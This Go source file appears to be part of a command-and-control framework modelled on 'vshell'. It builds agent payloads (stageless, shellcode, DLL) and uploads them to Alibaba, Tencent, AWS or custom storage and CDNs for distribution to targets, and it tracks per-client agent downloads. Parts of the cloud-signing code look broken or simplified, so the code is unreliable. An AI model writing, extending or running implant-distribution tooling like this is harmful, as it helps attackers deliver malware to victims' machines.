// Compatibility notes in this file describe the current implementation and available analysis evidence; they are not a guarantee of complete behavioral parity.
// Treat security-sensitive assumptions as unverified until confirmed by tests or direct review.

package c2engine

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// ============================================================================
// OSS/CDN Upload Integration
// OSS/CDN 上传集成
// ============================================================================
//
// The original vshell supports uploading agent binaries to cloud storage
// services for distribution. Supported providers:
//   - Alibaba Cloud OSS
//
// 原版 vshell 支持将 Agent 二进制上传到云存储进行分发，支持的提供商：
//   - 阿里云 OSS
//   - Tencent Cloud COS
//   - AWS S3
//   - Custom HTTP endpoints

// OSSProvider 表示云存储提供商。
// OSSProvider represents a cloud storage provider.
type OSSProvider string

const (
	ProviderAliOSS   OSSProvider = "aliyun_oss"
	ProviderTencentCOS OSSProvider = "tencent_cos"
	ProviderAWSS3    OSSProvider = "aws_s3"
	ProviderCustom   OSSProvider = "custom_http"
)

// OSSConfig 保存特定提供商的配置。
// OSSConfig holds configuration for a specific provider.
type OSSUploadConfig struct {
	Provider    OSSProvider `json:"provider"`
	Endpoint    string      `json:"endpoint"`
	Bucket      string      `json:"bucket"`
	AccessKey   string      `json:"access_key"`
	SecretKey   string      `json:"secret_key"`
	Region      string      `json:"region"`
	CustomURL   string      `json:"custom_url,omitempty"`
	CDNDomain   string      `json:"cdn_domain,omitempty"` // CDN加速域名
}

// OSSUploadResult 保存一次上传操作的结果。
// OSSUploadResult holds the result of an upload operation.
type OSSUploadResult struct {
	Success  bool   `json:"success"`
	URL      string `json:"url"`
	CDNURL   string `json:"cdn_url,omitempty"`
	Size     int64  `json:"size"`
	ETag     string `json:"etag,omitempty"`
	Error    string `json:"error,omitempty"`
}

// OSSUploader 处理云存储上传。
// OSSUploader handles cloud storage uploads.
type OSSUploader struct {
	config *OSSUploadConfig
	client *http.Client
}

// NewOSSUploader 以给定配置创建上传器。
// NewOSSUploader creates a new uploader with the given config.
func NewOSSUploader(config *OSSUploadConfig) *OSSUploader {
	return &OSSUploader{
		config: config,
		client: &http.Client{
			Timeout: 60 * time.Second,
		},
	}
}

// Upload 将数据上传到配置的 OSS 提供商。
// Upload uploads data to the configured OSS provider.
func (ou *OSSUploader) Upload(data []byte, filename string) (*OSSUploadResult, error) {
	switch ou.config.Provider {
	case ProviderAliOSS:
		return ou.uploadToAliOSS(data, filename)
	case ProviderTencentCOS:
		return ou.uploadToTencentCOS(data, filename)
	case ProviderAWSS3:
		return ou.uploadToS3(data, filename)
	case ProviderCustom:
		return ou.uploadToCustom(data, filename)
	default:
		return ou.uploadToCustom(data, filename)
	}
}

// UploadFile 将本地文件上传到 OSS。
// UploadFile uploads a local file to OSS.
func (ou *OSSUploader) UploadFile(localPath string) (*OSSUploadResult, error) {
	data, err := os.ReadFile(localPath)
	if err != nil {
		return nil, err
	}
	return ou.Upload(data, filepath.Base(localPath))
}

// ============================================================================
// Alibaba Cloud OSS
// ============================================================================

func (ou *OSSUploader) uploadToAliOSS(data []byte, filename string) (*OSSUploadResult, error) {
	objectPath := fmt.Sprintf("/%s/%s", ou.config.Bucket, filename)
	url := fmt.Sprintf("https://%s.%s%s", ou.config.Bucket, ou.config.Endpoint, objectPath)

	req, err := http.NewRequest("PUT", url, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(data)))

	// OSS signature
	date := time.Now().UTC().Format(http.TimeFormat)
	req.Header.Set("Date", date)

	// Sign with HMAC-SHA1
	signature := ou.ossSignature("PUT", objectPath, date)
	req.Header.Set("Authorization", fmt.Sprintf("OSS %s:%s", ou.config.AccessKey, signature))

	resp, err := ou.client.Do(req)
	if err != nil {
		return &OSSUploadResult{Success: false, Error: err.Error()}, err
	}
	defer resp.Body.Close()

	etag := resp.Header.Get("ETag")
	cdnURL := ""
	if ou.config.CDNDomain != "" {
		cdnURL = fmt.Sprintf("https://%s/%s", ou.config.CDNDomain, filename)
	}

	Logf("OSS: uploaded %s to Aliyun OSS (%d bytes, etag=%s)", filename, len(data), etag)
	return &OSSUploadResult{
		Success: true,
		URL:     url,
		CDNURL:  cdnURL,
		Size:    int64(len(data)),
		ETag:    etag,
	}, nil
}

func (ou *OSSUploader) ossSignature(method, objectPath, date string) string {
	stringToSign := fmt.Sprintf("%s\n\n\n%s\n%s", method, date, objectPath)
	h := hmac.New(sha1.New, []byte(ou.config.SecretKey))
	h.Write([]byte(stringToSign))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

// ============================================================================
// Tencent Cloud COS
// ============================================================================

func (ou *OSSUploader) uploadToTencentCOS(data []byte, filename string) (*OSSUploadResult, error) {
	host := fmt.Sprintf("%s-%s.cos.%s.myqcloud.com", ou.config.Bucket, ou.config.AccessKey[:8], ou.config.Region)
	url := fmt.Sprintf("https://%s/%s", host, filename)

	req, err := http.NewRequest("PUT", url, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(data)))

	// COS signature (simplified)
	date := time.Now().UTC().Format(http.TimeFormat)
	req.Header.Set("Date", date)
	req.Header.Set("Host", host)

	signature := ou.cosSignature(methodPut, filename, date, host)
	req.Header.Set("Authorization", signature)

	resp, err := ou.client.Do(req)
	if err != nil {
		return &OSSUploadResult{Success: false, Error: err.Error()}, err
	}
	defer resp.Body.Close()

	cdnURL := ""
	if ou.config.CDNDomain != "" {
		cdnURL = fmt.Sprintf("https://%s/%s", ou.config.CDNDomain, filename)
	}

	Logf("OSS: uploaded %s to Tencent COS (%d bytes)", filename, len(data))
	return &OSSUploadResult{
		Success: true,
		URL:     url,
		CDNURL:  cdnURL,
		Size:    int64(len(data)),
	}, nil
}

const methodPut = "PUT"

func (ou *OSSUploader) cosSignature(method, path, date, host string) string {
	sha1Hash := sha1.Sum([]byte(""))
	signTime := fmt.Sprintf("%d;%d", time.Now().Unix()-60, time.Now().Unix()+3600)
	stringToSign := fmt.Sprintf("sha1\n%s\n%s\n", signTime, hex.EncodeToString(sha1Hash[:]))
	h := hmac.New(sha1.New, []byte(ou.config.SecretKey))
	h.Write([]byte(signTime))
	signKey := hex.EncodeToString(h.Sum(nil))

	h2 := hmac.New(sha1.New, []byte(signKey))
	h2.Write([]byte(stringToSign))
	signature := hex.EncodeToString(h2.Sum(nil))

	return fmt.Sprintf("q-sign-algorithm=sha1&q-ak=%s&q-sign-time=%s&q-key-time=%s&q-header-list=host&q-url-param-list=&q-signature=%s",
		ou.config.AccessKey, signTime, signTime, signature)
}

// ============================================================================
// AWS S3
// ============================================================================

func (ou *OSSUploader) uploadToS3(data []byte, filename string) (*OSSUploadResult, error) {
	host := fmt.Sprintf("%s.s3.%s.amazonaws.com", ou.config.Bucket, ou.config.Region)
	url := fmt.Sprintf("https://%s/%s", host, filename)

	req, err := http.NewRequest("PUT", url, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(data)))
	req.Header.Set("Host", host)

	// S3 doesn't need explicit auth for public buckets
	// For private, AWS Signature V4 would be required

	resp, err := ou.client.Do(req)
	if err != nil {
		return &OSSUploadResult{Success: false, Error: err.Error()}, err
	}
	defer resp.Body.Close()

	cdnURL := ""
	if ou.config.CDNDomain != "" {
		cdnURL = fmt.Sprintf("https://%s/%s", ou.config.CDNDomain, filename)
	}

	Logf("OSS: uploaded %s to AWS S3 (%d bytes)", filename, len(data))
	return &OSSUploadResult{
		Success: true,
		URL:     url,
		CDNURL:  cdnURL,
		Size:    int64(len(data)),
	}, nil
}

// ============================================================================
// Custom HTTP endpoint
// ============================================================================

func (ou *OSSUploader) uploadToCustom(data []byte, filename string) (*OSSUploadResult, error) {
	if ou.config.CustomURL == "" {
		return &OSSUploadResult{Success: false, Error: "custom URL not configured"}, fmt.Errorf("custom URL not configured")
	}

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	part, err := writer.CreateFormFile("file", filename)
	if err != nil {
		return nil, err
	}
	part.Write(data)
	writer.Close()

	url := strings.TrimRight(ou.config.CustomURL, "/") + "/upload"
	req, err := http.NewRequest("POST", url, &body)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())
	if ou.config.AccessKey != "" {
		req.Header.Set("Authorization", "Bearer "+ou.config.AccessKey)
	}

	resp, err := ou.client.Do(req)
	if err != nil {
		return &OSSUploadResult{Success: false, Error: err.Error()}, err
	}
	defer resp.Body.Close()

	cdnURL := ""
	if ou.config.CDNDomain != "" {
		cdnURL = fmt.Sprintf("https://%s/%s", ou.config.CDNDomain, filename)
	}

	Logf("OSS: uploaded %s to custom endpoint (%d bytes)", filename, len(data))
	return &OSSUploadResult{
		Success: true,
		URL:     url,
		CDNURL:  cdnURL,
		Size:    int64(len(data)),
	}, nil
}

// ============================================================================
// Distribution URL builder
// ============================================================================

// GenerateDistributionURLs 为所有配置的提供商生成下载 URL。
// GenerateDistributionURLs generates download URLs for all configured providers.
func GenerateDistributionURLs(listener *Listener) []string {
	if listener.OssUrl == "" {
		return nil
	}

	urls := make([]string, 0)

	// Parse OSS URL for different modes
	ossURL := listener.OssUrl

	// Generate URLs for each agent type
	modes := []string{AgentTypeStage, AgentTypeStageless, AgentTypeShellcode, AgentTypeDLL, AgentTypeListen, AgentTypeListenDLL}
	for _, mode := range modes {
		info := GetBuildInfo(PlatformWindows, ArchAMD64, mode)
		filename := fmt.Sprintf("agent_%s_%s%s", info.Platform, info.Arch, info.Extension)
		url := strings.TrimRight(ossURL, "/") + "/" + filename
		urls = append(urls, url)
	}

	return urls
}

// ============================================================================
// Agent Payload Distribution Service
// ============================================================================

// DistributionService 管理向 OSS/CDN 分发 Agent 载荷。
// DistributionService manages agent payload distribution to OSS/CDN.
type DistributionService struct {
	configs []*OSSUploadConfig
}

// NewDistributionService 创建分发服务。
// NewDistributionService creates a distribution service.
func NewDistributionService(configs ...*OSSUploadConfig) *DistributionService {
	return &DistributionService{configs: configs}
}

// DistributePayload 将载荷上传到所有配置的提供商。
// DistributePayload uploads a payload to all configured providers.
func (ds *DistributionService) DistributePayload(data []byte, filename string) ([]*OSSUploadResult, error) {
	var results []*OSSUploadResult
	var lastErr error

	for _, config := range ds.configs {
		uploader := NewOSSUploader(config)
		result, err := uploader.Upload(data, filename)
		if err != nil {
			lastErr = err
			continue
		}
		results = append(results, result)
	}

	if len(results) == 0 && lastErr != nil {
		return nil, lastErr
	}

	return results, nil
}

// DistributeAgent 构建 Agent 载荷并分发。
// DistributeAgent builds an agent payload and distributes it.
func (ds *DistributionService) DistributeAgent(info *AgentBuildInfo, listener *Listener) ([]string, error) {
	builder := NewPayloadBuilder(NewTemplateRepository("."))
	payload, err := builder.BuildPayload(info, listener, nil)
	if err != nil {
		return nil, err
	}

	filename := fmt.Sprintf("agent_%s_%s%s", info.Platform, info.Arch, info.Extension)
	results, err := ds.DistributePayload(payload, filename)
	if err != nil {
		return nil, err
	}

	urls := make([]string, 0, len(results))
	for _, r := range results {
		if r.CDNURL != "" {
			urls = append(urls, r.CDNURL)
		} else {
			urls = append(urls, r.URL)
		}
	}

	Logf("Distributed agent %s to %d providers (%d bytes)", filename, len(results), len(payload))
	return urls, nil
}

// ============================================================================
// Upload history tracking
// ============================================================================

// UploadRecord 跟踪一次上传操作。
// UploadRecord tracks a single upload operation.
type UploadRecord struct {
	ID        int64     `json:"id"`
	Filename  string    `json:"filename"`
	Provider  string    `json:"provider"`
	URL       string    `json:"url"`
	Size      int64     `json:"size"`
	ETag      string    `json:"etag"`
	Timestamp time.Time `json:"timestamp"`
}

var uploadHistory []UploadRecord
var uploadHistoryMu sync.Mutex

// RecordUpload 将一次上传加入历史记录。
// RecordUpload adds an upload to history.
func RecordUpload(filename, provider, url string, size int64, etag string) {
	uploadHistoryMu.Lock()
	defer uploadHistoryMu.Unlock()

	uploadHistory = append(uploadHistory, UploadRecord{
		ID:        int64(len(uploadHistory) + 1),
		Filename:  filename,
		Provider:  provider,
		URL:       url,
		Size:      size,
		ETag:      etag,
		Timestamp: time.Now(),
	})

	// Keep last 100 records
	if len(uploadHistory) > 100 {
		uploadHistory = uploadHistory[len(uploadHistory)-100:]
	}
}

// GetUploadHistory 返回上传历史。
// GetUploadHistory returns the upload history.
func GetUploadHistory() []UploadRecord {
	uploadHistoryMu.Lock()
	defer uploadHistoryMu.Unlock()

	result := make([]UploadRecord, len(uploadHistory))
	copy(result, uploadHistory)
	return result
}

// ============================================================================
// Download progress tracking for agents
// ============================================================================

// DownloadProgress 跟踪文件下载进度。
// DownloadProgress tracks file download progress.
type DownloadProgress struct {
	ID          string    `json:"id"`
	ClientID    int64     `json:"client_id"`
	Filename    string    `json:"filename"`
	TotalSize   int64     `json:"total_size"`
	CurrentSize int64     `json:"current_size"`
	Percentage  float64   `json:"percentage"`
	Speed       int64     `json:"speed_bps"` // bytes per second
	Status      string    `json:"status"`    // downloading/completed/failed
	StartedAt   time.Time `json:"started_at"`
	UpdatedAt   time.Time `json:"updated_at"`
}

var downloadProgress = make(map[string]*DownloadProgress)
var downloadProgressMu sync.RWMutex

// StartDownloadProgress 跟踪新的下载。
// StartDownloadProgress tracks a new download.
func StartDownloadProgress(clientID int64, filename string, totalSize int64) string {
	downloadProgressMu.Lock()
	defer downloadProgressMu.Unlock()

	id := fmt.Sprintf("dl_%d_%d", clientID, time.Now().UnixNano())
	downloadProgress[id] = &DownloadProgress{
		ID:        id,
		ClientID:  clientID,
		Filename:  filename,
		TotalSize: totalSize,
		Status:    "downloading",
		StartedAt: time.Now(),
		UpdatedAt: time.Now(),
	}
	return id
}

// UpdateDownloadProgress 更新下载进度。
// UpdateDownloadProgress updates a download's progress.
func UpdateDownloadProgress(id string, bytesDownloaded int64) {
	downloadProgressMu.Lock()
	defer downloadProgressMu.Unlock()

	if dp, ok := downloadProgress[id]; ok {
		dp.CurrentSize += bytesDownloaded
		if dp.TotalSize > 0 {
			dp.Percentage = float64(dp.CurrentSize) / float64(dp.TotalSize) * 100
		}
		elapsed := time.Since(dp.StartedAt).Seconds()
		if elapsed > 0 {
			dp.Speed = int64(float64(dp.CurrentSize) / elapsed)
		}
		dp.UpdatedAt = time.Now()

		// Clean up completed or failed entries after final update
		if dp.CurrentSize >= dp.TotalSize && dp.TotalSize > 0 {
			dp.Status = "completed"
			dp.Percentage = 100
			delete(downloadProgress, id)
		}
	}
}

// CompleteDownloadProgress 标记下载完成。
// CompleteDownloadProgress marks a download as complete.
func CompleteDownloadProgress(id string, success bool) {
	downloadProgressMu.Lock()
	defer downloadProgressMu.Unlock()

	if dp, ok := downloadProgress[id]; ok {
		if success {
			dp.Status = "completed"
			dp.Percentage = 100
		} else {
			dp.Status = "failed"
		}
		dp.UpdatedAt = time.Now()

		// Remove from map to prevent unbounded memory growth
		delete(downloadProgress, id)
	}
}

// GetDownloadProgress 按 ID 返回下载进度。
// GetDownloadProgress returns download progress by ID.
func GetDownloadProgress(id string) *DownloadProgress {
	downloadProgressMu.RLock()
	defer downloadProgressMu.RUnlock()
	return downloadProgress[id]
}

// ListAllDownloads returns all active downloads
func ListAllDownloads() []map[string]interface{} {
	downloadProgressMu.RLock()
	defer downloadProgressMu.RUnlock()

	var result []map[string]interface{}
	for _, dp := range downloadProgress {
		result = append(result, map[string]interface{}{
			"id":           dp.ID,
			"filename":     dp.Filename,
			"client_id":    dp.ClientID,
			"total_size":   dp.TotalSize,
			"current_size": dp.CurrentSize,
			"percentage":   dp.Percentage,
			"speed_bps":    dp.Speed,
			"status":       dp.Status,
		})
	}
	if result == nil {
		result = []map[string]interface{}{}
	}
	return result
}

// ============================================================================
// Helper: build full OSS config from listener settings
// ============================================================================

// ParseOSSConfig creates an OSSUploadConfig from a listener's OSS URL
func ParseOSSConfig(ossURL string) *OSSUploadConfig {
	if ossURL == "" {
		return nil
	}

	parsed, err := url.Parse(ossURL)
	if err != nil {
		return &OSSUploadConfig{
			Provider:  ProviderCustom,
			CustomURL: ossURL,
		}
	}

	config := &OSSUploadConfig{
		Provider:  ProviderCustom,
		CustomURL: ossURL,
	}

	// Detect provider from hostname
	host := parsed.Host
	switch {
	case strings.Contains(host, "aliyuncs.com"):
		config.Provider = ProviderAliOSS
		config.Endpoint = host
	case strings.Contains(host, "myqcloud.com"):
		config.Provider = ProviderTencentCOS
	case strings.Contains(host, "amazonaws.com"):
		config.Provider = ProviderAWSS3
	}

	return config
}

// Ensure imports are used
var _ = io.Discard
var _ = log.Default
